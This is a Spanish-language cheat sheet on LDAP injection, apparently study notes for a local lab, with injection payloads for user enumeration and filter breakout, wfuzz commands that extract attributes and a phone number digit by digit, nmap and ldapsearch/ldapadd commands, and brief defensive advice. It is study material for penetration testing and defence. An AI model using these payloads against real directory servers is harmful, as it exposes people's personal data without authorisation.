---

### 🗃️ **LDAP Injection Cheat Sheet**

---
---
#### **¿Qué es una inyección LDAP?**

Las inyecciones LDAP (Lightweight Directory Access Protocol) son un tipo de ataque en el que un atacante **inyecta comandos LDAP maliciosos** en campos de entrada web que interactúan con un servidor LDAP.  
Si la aplicación no valida adecuadamente la entrada, el atacante puede manipular las consultas LDAP para:  

- **Acceder a información confidencial** de usuarios o recursos.  
- **Modificar datos**: agregar, eliminar o modificar usuarios y recursos.  
- **Realizar operaciones maliciosas** en la red, como phishing o instalación de malware.  

---

### **Ejemplos de Ataques LDAP Injection**

#### **Enumeración de usuarios:**
```http
user_id=o*&password=\*&login=1&submit=Submit
```
- **Indicador de éxito:** Código de respuesta **301**, lo que indica que el usuario existe.  
- **Nota:** Utiliza el comodín `*` para enumerar.  

#### **Inyección LDAP Básica:**
```http
user_id=omar)(mail=\*))%00&password=\*&login=1&submit=Submit
```
- **Objetivo:** Obtener información del atributo `mail` para el usuario `omar`.  
- **Indicador de éxito:** Respuesta HTTP exitosa o cambio en la respuesta.  

---

### **Fuzzing de Atributos con Wfuzz**

#### **Fuzzing de Atributos LDAP:**
```bash
wfuzz -c --hh=550 -w /usr/share/seclists/Fuzzing/LDAP-openldap-attributes.txt -d 'user_id=admin)(FUZZ=\*))%00&password=\*&login=1&submit=Submit' http://localhost:8888
```
- **Uso de diccionario:** Prueba diferentes atributos para identificar posibles campos válidos.

---

#### **Enumeración de Teléfonos:**
- **Primer número:**
  ```bash
  wfuzz -c --hh=550 -z range,0-9 -d 'user_id=fran)(telephoneNumber=FUZZ*))%00&password=\*&login=1&submit=Submit' http://localhost:8888
  ```
- **Segundo número:**
  ```bash
  wfuzz -c --hh=550 -z range,0-9 -d 'user_id=fran)(telephoneNumber=5FUZZ*))%00&password=\*&login=1&submit=Submit' http://localhost:8888
  ```
- **Nota:** Repite el proceso para cada posición del número.  

---

### **Comandos Útiles para Interactuar con LDAP**

#### **Búsqueda en el Servidor LDAP:**
```bash
ldapsearch -x -H ldap://localhost -b dc=example,dc=org -D "cn=admin,dc=example,dc=org" -w admin 'cn=admin'
```
- **Descripción:** Realiza una consulta LDAP para obtener información.  
- **Tip:** Puedes usar scripts de nmap para identificar argumentos válidos:
  ```bash
  sudo nmap --script ldap* -p 389 localhost
  ```

---

#### **Añadir Usuarios a LDAP:**
```bash
ldapadd -x -H ldap://localhost -D "cn=admin,dc=example,dc=org" -w admin -f newuser.ldiff
```
- **Descripción:** Añade un nuevo usuario usando un archivo LDIF.  
- **Archivo `newuser.ldiff`**:
  ```
  dn: cn=newuser,dc=example,dc=org
  objectClass: inetOrgPerson
  cn: newuser
  sn: user
  uid: newuser
  userPassword: password123
  ```
---

### **Aclaraciones Importantes:**
1. **Validación de entrada:** Evita el uso directo de la entrada del usuario en consultas LDAP.  
2. **Uso de caracteres especiales:** Asegúrate de escapar correctamente los caracteres peligrosos.  
3. **Monitorización continua:** Implementa alertas ante patrones sospechosos en el tráfico LDAP.  

---

**Consejo:** Guarda esta cheat sheet en Obsidian para tener siempre a mano los comandos y técnicas. 🚀